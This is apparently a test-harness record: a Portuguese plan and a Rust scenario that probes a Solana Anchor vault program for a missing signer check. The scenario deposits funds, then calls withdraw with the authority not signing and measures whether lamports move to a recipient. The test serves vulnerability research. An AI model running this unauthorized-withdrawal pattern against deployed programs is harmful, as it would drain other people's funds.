{
  "plan": "O cenário inicializa um vault PDA com autoridade legítima e deposita fundos, usando as instruções initialize e deposit como baseline. Em seguida, tenta executar withdraw sem a assinatura da autoridade, passando a conta authority como não-signer, para verificar se o programa exige a assinatura. O efeito medido é a redução do saldo do vault e o aumento do saldo do recipient, demonstrando que a operação restrita foi executada sem a assinatura da autoridade.",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();
let (vault_pda, _bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

// Contas iniciais
let authority_account = wallet(10_000_000_000);
let recipient_account = wallet(1_000_000_000);
let vault_account = empty_account();
let system_program = system_program_account();

// Baseline: initialize
let ix_init = env.anchor_ix("initialize", &(), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program.0, false),
]);
let accounts_init = vec![
    (vault_pda, vault_account.clone()),
    (authority, authority_account.clone()),
    system_program.clone(),
];
let r_init = env.baseline("initialize vault", &ix_init, &accounts_init);

// Atualiza contas após initialize
let mut accounts_after_init = r_init.resulting_accounts.clone();
let vault_after_init = accounts_after_init.iter().find(|(k, _)| *k == vault_pda).map(|(_, a)| a.clone()).unwrap_or(vault_account.clone());

// Baseline: deposit
let deposit_amount = 5_000_000_000u64;
let ix_deposit = env.anchor_ix("deposit", &(&deposit_amount,), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program.0, false),
]);
let accounts_deposit = vec![
    (vault_pda, vault_after_init.clone()),
    (authority, authority_account.clone()),
    system_program.clone(),
];
let r_deposit = env.baseline("deposit into vault", &ix_deposit, &accounts_deposit);

// Estado após deposit
let mut accounts_after_deposit = r_deposit.resulting_accounts.clone();
let vault_after_deposit = accounts_after_deposit.iter().find(|(k, _)| *k == vault_pda).map(|(_, a)| a.clone()).unwrap_or(vault_after_init.clone());
let authority_after_deposit = accounts_after_deposit.iter().find(|(k, _)| *k == authority).map(|(_, a)| a.clone()).unwrap_or(authority_account.clone());
let recipient_after_deposit = accounts_after_deposit.iter().find(|(k, _)| *k == recipient).map(|(_, a)| a.clone()).unwrap_or(recipient_account.clone());

// Ataque: withdraw sem assinatura da autoridade
let withdraw_amount = 1_000_000_000u64;
let ix_attack = env.anchor_ix("withdraw", &(&withdraw_amount,), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new_readonly(authority, false), // não assina
    AccountMeta::new(recipient, false),
]);
let accounts_attack = vec![
    (vault_pda, vault_after_deposit.clone()),
    (authority, authority_after_deposit.clone()),
    (recipient, recipient_after_deposit.clone()),
];
let r_attack = env.attack("withdraw without authority signature", &ix_attack, &accounts_attack);

if r_attack.program_result == ProgramResult::Success {
    let vault_after = after(&r_attack, &vault_pda);
    let recipient_after = after(&r_attack, &recipient);
    let vault_balance_after = read_u64(vault_after.data(), 40); // authority (32) + balance (8) -> offset 40
    let recipient_lamports_after = recipient_after.lamports();
    env.effect("vault balance decreased without authority signature", vault_balance_after == 4_000_000_000);
    env.effect("recipient received lamports without authority signature", recipient_lamports_after > 1_000_000_000);
}"
}

